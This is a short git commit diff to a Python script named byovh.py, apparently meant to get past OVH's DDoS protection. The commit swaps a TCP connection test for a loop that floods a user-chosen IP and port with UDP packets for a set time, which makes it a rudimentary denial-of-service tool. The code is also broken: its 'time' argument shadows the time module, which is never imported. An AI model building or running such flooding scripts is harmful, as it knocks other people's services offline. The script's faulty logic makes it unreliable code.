42d8f36d8b2b0b7aee0fe5b033220db4cd6c60ce
zJonchx <jonathaneliaschavez123@gmail.com>
2025-07-14 13:27:59 -0300

    Update byovh.py

--- byovh.py
+++ byovh.py
@@ -1,15 +1,19 @@
 import socket
 
 def bypass(ip, port, time):
-    try:
-        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        sock.settimeout(time)
-        sock.connect((ip, port))
-        print("Bypass successful")
-    except:
-        print("Bypass failed")
-    sock.close()
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    start_time = time.time()
+    data = "hello"  # Los datos que se van a enviar
 
+    while time.time() - start_time < time:
+        result = sock.sendto(data.encode(), (ip, port))  # intenta enviar los datos
+    sock.close()
+    
+    if result: 
+        print("Bypass successful")
+    else:
+        print("Bypass failed")
+   
 ip = input("Enter IP: ")
 port = int(input("Enter port: "))
 time = float(input("Enter timeout(s): "))
